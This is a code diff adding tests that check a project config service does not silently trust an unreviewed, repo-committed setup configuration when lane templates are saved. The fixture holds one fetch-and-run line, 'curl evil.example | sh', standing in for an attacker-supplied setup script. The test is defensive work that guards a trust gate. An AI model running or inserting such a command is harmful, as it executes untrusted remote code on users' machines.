@@ -5,6 +5,7 @@ import YAML from "yaml";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { openKvDb } from "../state/kvDb";
 import { createProjectConfigService, mergeAiConfig } from "./projectConfigService";
+import { createLaneTemplateService } from "../lanes/laneTemplateService";
 
 function makeDb() {
   const store = new Map<string, unknown>();
@@ -493,6 +494,81 @@ describe("projectConfigService - lane env init setup scripts and copy paths", ()
       copyPaths: [{ source: ".env.local" }],
       setupScript: { unixCommands: ["./scripts/seed.sh"] },
     });
+  });
+});
+
+describe("projectConfigService - shared config trust on save", () => {
+  function writeUntrustedSharedConfig(adeDir: string) {
+    fs.writeFileSync(
+      path.join(adeDir, "ade.yaml"),
+      YAML.stringify({
+        version: 1,
+        testSuites: [],
+        automations: [],
+        laneOverlayPolicies: [],
+        laneEnvInit: { setupScript: { commands: ["curl evil.example | sh"] } },
+      }),
+      "utf8",
+    );
+  }
+
+  it("does not trust an unreviewed shared config just because a lane template was saved", () => {
+    // `save` takes both scopes, so every local-only writer round-trips the
+    // shared snapshot untouched. Trusting on every save meant editing one lane
+    // template silently approved a repo-committed `.ade/ade.yaml` nobody read —
+    // exactly the attacker-supplied file the setup-script gate exists to stop.
+    const { root, adeDir } = makeProjectFixture("ade-project-config-trust-template-");
+    writeUntrustedSharedConfig(adeDir);
+
+    const service = createProjectConfigService({
+      projectRoot: root,
+      adeDir,
+      projectId: "project-1",
+      db: makeDb(),
+      logger: quietLogger(),
+    });
+    expect(service.get().trust.requiresSharedTrust).toBe(true);
+
+    const templateService = createLaneTemplateService({
+      projectConfigService: service,
+      logger: quietLogger(),
+    });
+    templateService.saveTemplate({ id: "tpl-1", name: "Backend" });
+
+    expect(service.get().trust.requiresSharedTrust).toBe(true);
+    expect(templateService.listTemplates()).toHaveLength(1);
+
+    // Same for the other local-scope writers.
+    templateService.setDefaultTemplateId("tpl-1");
+    expect(service.get().trust.requiresSharedTrust).toBe(true);
+    templateService.deleteTemplate("tpl-1");
+    expect(service.get().trust.requiresSharedTrust).toBe(true);
+  });
+
+  it("trusts the shared config when the caller actually edits the shared scope", () => {
+    // The user reviewed what they just wrote, so an explicit shared edit still
+    // carries trust — otherwise saving through Settings would leave the project
+    // permanently unable to run its own setup scripts.
+    const { root, adeDir } = makeProjectFixture("ade-project-config-trust-shared-edit-");
+    writeUntrustedSharedConfig(adeDir);
+
+    const service = createProjectConfigService({
+      projectRoot: root,
+      adeDir,
+      projectId: "project-1",
+      db: makeDb(),
+      logger: quietLogger(),
+    });
+    const snapshot = service.get();
+    expect(snapshot.trust.requiresSharedTrust).toBe(true);
+
+    const saved = service.save({
+      shared: { ...snapshot.shared, laneEnvInit: { setupScript: { commands: ["npm run bootstrap"] } } },
+      local: snapshot.local,
+    });
+
+    expect(saved.trust.requiresSharedTrust).toBe(false);
+    expect(service.get().trust.requiresSharedTrust).toBe(false);
   });
 });
 
